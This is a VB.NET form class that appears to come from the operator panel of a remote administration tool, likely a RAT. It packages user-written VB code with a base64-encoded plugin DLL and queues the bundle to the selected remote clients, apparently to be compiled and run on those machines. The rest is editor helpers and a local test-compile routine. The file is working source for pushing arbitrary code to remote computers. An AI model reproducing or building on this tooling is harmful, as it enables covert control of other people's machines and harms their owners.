Imports System.CodeDom.Compiler
Imports System.IO

Public Class VBCode
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If editor.Text = Nothing Then
            Else
                Dim alist As String = Nothing
                For Each dad In ListBox1.Items
                    alist &= dad & ","
                Next
                Dim B As Byte() = SB("vbb" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\VB.dll")) & Settings.SPL & editor.Text & Settings.SPL & alist.Trim.TrimEnd(","))
                For Each C As ListViewItem In Form1.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
                MessageBox.Show("DONE!")
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub VBCode_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            editor.Text = My.Resources.VBCode
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
        ToolStripStatusLabel1.Text = "Selected [" & Form1.Lv1.SelectedItems.Count & "]"
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            Clipboard.SetText(editor.SelectedText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasteToolStripMenuItem.Click
        Try
            editor.SelectedText = Clipboard.GetText
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        Try
            editor.Cut()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RestToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestToolStripMenuItem.Click
        Dim result As Integer = MessageBox.Show("Are You Sure?", "Clear!", MessageBoxButtons.YesNo)
        If result = DialogResult.Yes Then
            editor.Clear()
        End If
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Try
            ListBox1.Items.Remove(ListBox1.SelectedItem)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim str3 As String = Interaction.InputBox("Add Reference", "References", "")
        If str3.Length = 0 Or ListBox1.Items.Contains(str3) Then
        Else
            ListBox1.Items.Add(str3)
        End If
    End Sub
    Sub Compiler(ByVal codeDomProvider As CodeDomProvider, ByVal source As String, ByVal referencedAssemblies As String())
        Try
            Dim providerOptions = New Dictionary(Of String, String)() From {
                {"CompilerVersion", "v4.0"}
            }
            Dim compilerOptions = "/target:winexe /platform:anycpu /optimize-"
            Dim compilerParameters = New CompilerParameters(referencedAssemblies) With {
                .GenerateExecutable = True,
                .GenerateInMemory = True,
                .CompilerOptions = compilerOptions,
                .TreatWarningsAsErrors = False,
                .IncludeDebugInformation = False
            }
            Dim compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source)
            If compilerResults.Errors.Count > 0 Then
                For Each compilerError As CompilerError In compilerResults.Errors
                    MessageBox.Show(String.Format(compilerError.ErrorText, compilerError.Line), Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                    Exit For
                Next
            Else
                MessageBox.Show("No Error!", Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
        End Try
    End Sub

    Private Sub TestToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TestToolStripMenuItem.Click
        Dim providerOptions As Dictionary(Of String, String) = New Dictionary(Of String, String)() From {
 {"CompilerVersion", "v4.0"}
}
        Dim alist As String = Nothing
        For Each dad In ListBox1.Items
            alist &= dad & ","
        Next

        Compiler(New VBCodeProvider(providerOptions), editor.Text, alist.Trim.TrimEnd(",").Split(New String() {","}, StringSplitOptions.RemoveEmptyEntries))
    End Sub
End Class